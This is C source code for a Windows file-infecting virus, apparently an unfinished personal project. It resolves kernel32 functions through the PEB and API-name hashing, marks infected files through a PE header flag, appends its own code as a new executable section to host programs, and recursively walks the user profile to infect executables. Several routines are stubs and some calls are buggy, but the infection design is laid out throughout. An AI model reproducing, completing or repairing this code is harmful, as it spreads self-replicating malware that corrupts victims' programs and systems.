
#include "everything.h"

void GetFunctionAddress(PDATA data);
/**/
BYTE WINAPI IsValidExecutable(const PVOID file_data);
BYTE WINAPI Is64BitExecutable(const PVOID file_data);
BYTE WINAPI IsVirusExistedInFile(const PVOID file_data);

PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, DWORD file_size, const PVOID section_data, DWORD size, PDATA data);
void AdjustEntryPoint(PDATA data);
void ModifyJumpInstructionToVirusCode(PDATA data);

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);

void WINAPI InfectFile(PSTR file_name, PDATA data);
void WINAPI InfectUserProfile(PDATA data);
void WINAPI FindFile(PSTR directory, PDATA data);

DWORD Align(DWORD value, DWORD alignment)
{
    if (value % alignment == 0)
    {
        return value;
    }
    else
    {
        return (value/alignment + 1)*alignment;
    }
}

void ZeroMem(void* data, int size)
{
    for (int i = 0; i < size; i++)
    {
        *((unsigned char*)(data)+i) = 0;
    }
}

void MemCopy(void* dst, void *src, int size)
{
    for (int i = 0; i < size; i++)
    {
        *((unsigned char*)(dst)+i) = *((unsigned char*)(src)+i);
    }
}

BYTE StrCmp(void* str1, void *str2)
{
    for (int i = 0; ; i++)
    {
        if (*((unsigned char*)(str1)+i) != *((unsigned char*)(str2)+i))
        {
            return 0;
        }
        if (*((unsigned char*)(str1)+i) == 0 || *((unsigned char*)(str2)+i) == 0)
        {
            return 1;
        }
    }
}

BYTE WINAPI IsValidExecutable(const PVOID file_data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS p_image_nt_headers;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;
    if(p_image_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return 0;
    }
    p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)file_data + p_image_dos_header->e_lfanew);
    if(p_image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
    {
        return 0;
    }
    return 1;
}

BYTE WINAPI Is64BitExecutable(const PVOID file_data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS32 p_image_nt_headers_32;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;

    p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)file_data + p_image_dos_header->e_lfanew);

    return p_image_nt_headers_32->OptionalHeader.Magic == 0x20b;
}

BYTE WINAPI IsVirusExistedInFile(const PVOID file_data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_NT_HEADERS32 p_image_nt_headers;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;
    p_image_nt_headers = (PIMAGE_NT_HEADERS32)((PUCHAR)file_data + p_image_dos_header->e_lfanew);

    if (Is64BitExecutable(file_data))
    {
        return ((PIMAGE_NT_HEADERS64)p_image_nt_headers)->OptionalHeader.LoaderFlags == VIRUS_FLAG;
    }
    else
    {
        return p_image_nt_headers->OptionalHeader.LoaderFlags == VIRUS_FLAG;
    }

}

PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, DWORD file_size, const PVOID section_data, DWORD section_size, PDATA data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_SECTION_HEADER p_image_section_header;

    DWORD file_alignment, section_alignment;
    ULONG i;

    p_image_dos_header = (PIMAGE_DOS_HEADER)file_data;
    if (Is64BitExecutable(file_data))
    {
        PIMAGE_NT_HEADERS64 p_image_nt_headers_64;
        p_image_nt_headers_64 = (PIMAGE_NT_HEADERS64)((PUCHAR)file_data + p_image_dos_header->e_lfanew);
        p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_64 + 1);
        i = p_image_nt_headers_64->FileHeader.NumberOfSections;
        file_alignment = p_image_nt_headers_64->OptionalHeader.FileAlignment;
        section_alignment = p_image_nt_headers_64->OptionalHeader.SectionAlignment;
        p_image_nt_headers_64->FileHeader.NumberOfSections++;
        p_image_nt_headers_64->OptionalHeader.SizeOfImage = Align(Align(
        p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize, section_alignment) + section_size, section_alignment);
        p_image_nt_headers_64->OptionalHeader.CheckSum = 0;

    }
    else
    {
        PIMAGE_NT_HEADERS32 p_image_nt_headers_32;
        p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)file_data + p_image_dos_header->e_lfanew);
        p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_32 + 1);
        i = p_image_nt_headers_32->FileHeader.NumberOfSections;
        file_alignment = p_image_nt_headers_32->OptionalHeader.FileAlignment;
        section_alignment = p_image_nt_headers_32->OptionalHeader.SectionAlignment;
        p_image_nt_headers_32->FileHeader.NumberOfSections++;
        p_image_nt_headers_32->OptionalHeader.SizeOfImage = Align(Align(
        p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize, section_alignment) + section_size, section_alignment);
        p_image_nt_headers_32->OptionalHeader.CheckSum = 0;
    }

    ZeroMem(&p_image_section_header[i], sizeof(IMAGE_SECTION_HEADER));

    p_image_section_header[i].Characteristics = IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE;

    p_image_section_header[i].PointerToRawData = Align(
        (DWORD)(p_image_section_header[i-1].PointerToRawData + p_image_section_header[i-1].SizeOfRawData),
        file_alignment
        );

    p_image_section_header[i].VirtualAddress = Align(
        p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize,
        section_alignment
        );

    p_image_section_header[i].SizeOfRawData = Align(
        section_size,
        section_alignment);

    p_image_section_header[i].Misc.VirtualSize = section_size;

    p_image_section_header[i].Name[0] = '.'; 
    p_image_section_header[i].Name[1] = 'h'; 
    p_image_section_header[i].Name[2] = 'i'; 
    p_image_section_header[i].Name[3] = 'e'; 
    p_image_section_header[i].Name[4] = 'u'; 
    p_image_section_header[i].Name[5] = 0; 
    p_image_section_header[i].Name[6] = 0; 
    p_image_section_header[i].Name[7] = 0;

    MemCopy((unsigned char *)file_data + p_image_section_header[i].PointerToRawData, section_data, section_size);

    return &p_image_section_header[i];
}

PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
{
    PIMAGE_DOS_HEADER p_image_dos_header;
    PIMAGE_SECTION_HEADER p_image_section_header;

    DWORD file_alignment, section_alignment;
    ULONG number_of_sections;

    DWORD entry_address = 0;

    char virus_name[6];

    p_image_dos_header = (PIMAGE_DOS_HEADER)mem_data;
    if (Is64BitExecutable(mem_data))
    {
        PIMAGE_NT_HEADERS64 p_image_nt_headers_64;
        p_image_nt_headers_64 = (PIMAGE_NT_HEADERS64)((PUCHAR)mem_data + p_image_dos_header->e_lfanew);
        p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_64 + 1);
        number_of_sections = p_image_nt_headers_64->FileHeader.NumberOfSections;
        entry_address = p_image_nt_headers_64->OptionalHeader.AddressOfEntryPoint;
    }
    else
    {
        PIMAGE_NT_HEADERS32 p_image_nt_headers_32;
        p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)mem_data + p_image_dos_header->e_lfanew);
        p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_32 + 1);
        number_of_sections = p_image_nt_headers_32->FileHeader.NumberOfSections;
        entry_address = p_image_nt_headers_32->OptionalHeader.AddressOfEntryPoint;

    }

    for (int i = 0; i < number_of_sections; i++)
    {
        if (p_image_section_header[i].VirtualAddress <= entry_address && 
            entry_address <= p_image_section_header[i].VirtualAddress + p_image_section_header[i].Misc.VirtualSize)
        {
            return &p_image_section_header[i];
        }
    }
    return NULL;

}

void AdjustEntryPoint(PDATA data)
{
    return;
}

void ModifyJumpInstructionToVirusCode(PDATA data)
{
    return;
}

void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
{
    PVOID section_data;
    DWORD section_size;

    PIMAGE_SECTION_HEADER virus_section = GetCurrentVirusSection(data->this_file_base_address);
    section_size = virus_section->SizeOfRawData;
    section_data = data->iat->fnVirtualAlloc(
        NULL, 
        section_size, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );

    MemCopy(section_data, (virus_section->VirtualAddress), section_size);

    AddVirusSection(file_data, file_size, section_data, section_size, data);

    data->iat->fnVirtualFree(
        section_size,
        0, 
        MEM_RELEASE
    );

    new_file_size = file_size + section_size;
    return;
}

void WINAPI InfectFile(PSTR file_name, PDATA data)
{
    HANDLE handle_file;
    ULONG file_size, new_file_size, section_size, bytes_read;
    PVOID file_data = NULL;
    DWORD number_of_bytes_written = 0;

    handle_file = data->iat->fnCreateFileA(
        file_name, 
        GENERIC_READ|GENERIC_WRITE, 
        FILE_SHARE_READ|FILE_SHARE_WRITE, 
        NULL,
        OPEN_EXISTING,
        0,NULL
    );

    if (handle_file == INVALID_HANDLE_VALUE)
    {
        goto END_FUNCTION;
    }

    file_size = data->iat->fnGetFileSize(handle_file, NULL);
    new_file_size = file_size + 0x100000;
    
    file_data = data->iat->fnVirtualAlloc(
        NULL, 
        new_file_size, 
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!file_data)
    {
        goto END_FUNCTION;
    }

    if (!data->iat->fnReadFile(handle_file, file_data, file_size, &bytes_read, NULL))
    {
        goto END_FUNCTION;
    }

    if (!IsValidExecutable(file_data) || IsVirusExistedInFile(file_data))
    {
        goto END_FUNCTION;
    }

    AddVirusToFile(file_data, file_size, data, &new_file_size);

    data->iat->fnWriteFile(handle_file, file_data, new_file_size, number_of_bytes_written, NULL);

    END_FUNCTION:
    if (handle_file != NULL)
    {
        data->iat->fnCloseHandle(handle_file);
    }
    if (file_data != NULL)
    {
        data->iat->fnVirtualFree(file_data, 0, MEM_RELEASE);
    }
    return;
} 

void WINAPI FindFile(PSTR directory, PDATA data)
{
    HANDLE handle_find;
    WIN32_FIND_DATAA find_data;

    char search_name[1028], full_path[1024];
 
    ZeroMem(search_name, sizeof(search_name));
    ZeroMem(&find_data, sizeof(WIN32_FIND_DATAA));

    for (int i = 0; i < 1024; i++)
    {
        search_name[i] = directory[i];
        if (directory[i] == 0)
        {
            search_name[i] = '\\';
            search_name[i+1] = '*';
            search_name[i+2] = '\0';
            break;
        }
    }

    handle_find  =  data->iat->fnFindFirstFileA(search_name, &find_data);

    if(handle_find != INVALID_HANDLE_VALUE)
    {
        while(data->iat->fnFindNextFileA(handle_find, &find_data))
        {
            if(find_data.cFileName[0] == '.')
            {
                continue;
            }
             
            ZeroMem(full_path,sizeof(full_path));
 
            if(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                FindFile(full_path, data);
            }
            else
            {
                InfectFile(full_path, data);
            }
        }
        data->iat->fnFindClose(handle_find);
    }
}

void WINAPI InfectUserProfile(PDATA data)
{
    InfectFile("E:\\Code\\C++\\1.exe", data);
    return;

    char user_profile[1024];
    char user_profile_str[12];
    user_profile_str[0] = 'u'; 
    user_profile_str[1] = 's'; 
    user_profile_str[2] = 'e'; 
    user_profile_str[3] = 'r'; 
    user_profile_str[4] = 'p'; 
    user_profile_str[5] = 'r'; 
    user_profile_str[6] = 'o'; 
    user_profile_str[7] = 'f'; 
    user_profile_str[8] = 'i'; 
    user_profile_str[9] = 'l'; 
    user_profile_str[10] = 'e'; 
    user_profile_str[11] = 0;
    data->iat->fnGetEnvironmentVariableA(user_profile_str, user_profile, sizeof(user_profile));
    FindFile(user_profile, data);
}

int main()
{
    IAT iat;
    DATA data;
    data.iat = &iat;
    GetFunctionAddress(&data);
    InfectUserProfile(&data);
}

void GetFunctionAddress(PDATA data)
{
    PPEB p_peb = NtCurrentPeb();

    data->this_file_base_address = (DWORD_PTR *)p_peb->Reserved3[1]; // (PVOID)(*(DWORD_PTR *)(((DWORD_PTR)p_peb) + 0x10))

    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)(p_peb->Ldr);
    
    ldr = CONTAINING_RECORD(p_peb->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Read the loader data

    PVOID kernel32_base = NULL;
    
    while(ldr != 0)
    {
        wchar_t* dll_name = (wchar_t*)(((UNICODE_STRING *)((unsigned long long)(ldr) + sizeof(PVOID) * 11))->Buffer);
        
        if (dll_name == NULL) break;
        //wcout << dll_name << endl;
        wchar_t c;
        DWORD hash = 0;
        for (int i = 0; i < 13; i++)
        {
            c = dll_name[i];
            if (L'A' <= c && c <= L'Z')
            {
                c = c - L'A' + L'a';
            }
            hash = (hash * 26 + c) % (DWORD)(1e9+7);
        }
        if (hash == 448935215) // hash of L"kernel32.dll"
        {
            kernel32_base = ldr->DllBase; // Store the address of kernel32
            break;
        }

        ldr = CONTAINING_RECORD(ldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    }

    PIMAGE_DOS_HEADER p_image_dos_header = (PIMAGE_DOS_HEADER)kernel32_base;
    PIMAGE_NT_HEADERS p_image_nt_headers = (PIMAGE_NT_HEADERS)((PUCHAR)kernel32_base + p_image_dos_header->e_lfanew);

    // Get the export directory of kernel32
    PIMAGE_EXPORT_DIRECTORY p_image_export_directory;

    p_image_export_directory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)kernel32_base + p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PULONG function_table = (PULONG)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfFunctions);

    PULONG name = (PULONG)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfNames);

    PUSHORT ordinal = (PUSHORT)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfNameOrdinals);

    for(int i = 0; i < p_image_export_directory->NumberOfNames; i++)
    {
        PUCHAR ptr = (PUCHAR)kernel32_base + name[i]; // Pointer to function name
        DWORD hash = 0;
 
        // Compute the hash
        while(*ptr)
        {
            hash = (hash * 26 + *ptr) % (DWORD)(1e9+7);
            ptr++;
        }
        hash = (hash * 26 + 0) % (DWORD)(1e9+7);

        // Hash of LoadLibraryExA
        if (hash == 0x1ad4f305)
        {
            data->iat->fnLoadLibraryExA = (pLoadLibraryExA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of GetProcAddress
        if (hash == 0xd38cd23)
        {
            data->iat->fnGetProcAddress = (pGetProcAddress)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of FindFirstFileA
        if (hash == 0x10b03781)
        {
            data->iat->fnFindFirstFileA = (pFindFirstFileA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of FindNextFileA
        if (hash == 0x4d01d59)
        {
            data->iat->fnFindNextFileA = (pFindNextFileA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of FindClose
        if (hash == 0x309c47e0)
        {
            data->iat->fnFindClose = (pFindClose)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of CreateFileA
        if (hash == 0xc75869c)
        {
            data->iat->fnCreateFileA = (pCreateFileA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of GetFileSize
        if (hash == 0x236f23d6)
        {
            data->iat->fnGetFileSize = (pGetFileSize)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of ReadFile
        if (hash == 0xc9a21e1)
        {
            data->iat->fnReadFile = (pReadFile)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of WriteFile
        if (hash == 0x5ce6ec2)
        {
            data->iat->fnWriteFile = (pWriteFile)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of CloseHandle
        if (hash == 0x158bec59)
        {
            data->iat->fnCloseHandle = (pCloseHandle)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of VirtualAlloc
        if (hash == 0x22b92187)
        {
            data->iat->fnVirtualAlloc = (pVirtualAlloc)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of VirtualFree
        if (hash == 0x25e4c2e3)
        {
            data->iat->fnVirtualFree = (pVirtualFree)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of CreateFileMappingA
        if (hash == 0x2da1e929)
        {
            data->iat->fnCreateFileMappingA = (pCreateFileMappingA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of MapViewOfFile
        if (hash == 0x3a2ef895)
        {
            data->iat->fnMapViewOfFile = (pMapViewOfFile)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of FlushViewOfFile
        if (hash == 0x29b0e5d7)
        {
            data->iat->fnFlushViewOfFile = (pFlushViewOfFile)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of UnmapViewOfFile
        if (hash == 0x12107238)
        {
            data->iat->fnUnmapViewOfFile = (pUnmapViewOfFile)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of GetEnvironmentVariableA
        if (hash == 0x32b50861)
        {
            data->iat->fnGetEnvironmentVariableA = (pGetEnvironmentVariableA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

        // Hash of CloseHandle
        if (hash == 0x158bec59)
        {
            data->iat->fnCloseHandle = (pCloseHandle)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
        }

    }
}